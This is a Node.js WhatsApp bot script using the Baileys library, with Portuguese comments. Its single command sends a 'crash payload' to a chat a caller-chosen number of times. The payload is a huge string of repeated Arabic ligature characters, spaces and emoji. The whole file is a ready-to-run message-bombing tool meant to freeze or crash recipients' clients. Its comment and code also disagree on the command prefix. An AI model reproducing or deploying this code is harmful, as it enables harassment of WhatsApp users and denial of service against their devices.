const { default: makeWASocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');

async function startBot() {
    const { state, saveCreds } = await useMultiFileAuthState('auth_info_baileys');
    const sock = makeWASocket({
        auth: state,
        printQRInTerminal: true
    });

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('messages.upsert', async ({ messages }) => {
        const msg = messages[0];
        if (!msg.message) return;
        
        const remoteJid = msg.key.remoteJid;
        const text = msg.message.conversation || msg.message.extendedTextMessage?.text || "";

        // Comando: !crash
        if (text.startsWith('}crash')) {
            try {
                const args = text.split(' ');
                const amount = parseInt(args[1]) || 1;
                
                const crashPayload = "﷽".repeat(10000) + " ".repeat(5000) + "🚀".repeat(1000);
                
                for (let i = 0; i < amount; i++) {
                    await sock.sendMessage(remoteJid, { 
                        text: crashPayload 
                    });
                }
                
                console.log(`Enviado ${amount} payloads de crash para ${remoteJid}`);
            } catch (err) {
                console.error("Erro ao enviar crash:", err);
            }
        }
    });
}

startBot();
